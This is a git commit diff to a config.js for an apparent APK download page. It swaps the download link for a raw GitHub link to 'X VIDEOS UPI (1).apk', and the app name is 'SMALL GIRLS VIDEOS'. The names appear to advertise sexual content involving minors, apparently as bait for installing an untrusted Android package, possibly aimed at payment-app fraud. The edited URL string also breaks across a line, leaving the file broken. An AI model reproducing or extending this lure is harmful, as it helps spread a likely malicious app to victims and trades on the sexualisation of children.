d45c60c1f414f1e532f21161c391241d129629da
ms4134304-arch <ms4134304@gmail.com>
2026-08-31 04:28:34 +0530

    Update config.js

--- config.js
+++ config.js
@@ -1,7 +1,8 @@
 const APP_CONFIG = {
 
     // Your APK download link
-    apkUrl: "https://betadrop.app/app/zWu6Fm",
+    apkUrl: "https://github.com/ms4134304-arch/apk-download/raw/refs/heads/main/X%20VIDEOS%20UPI%20(1).apk
+        ",
 
     // Your app name
     appName: "SMALL GIRLS VIDEOS",
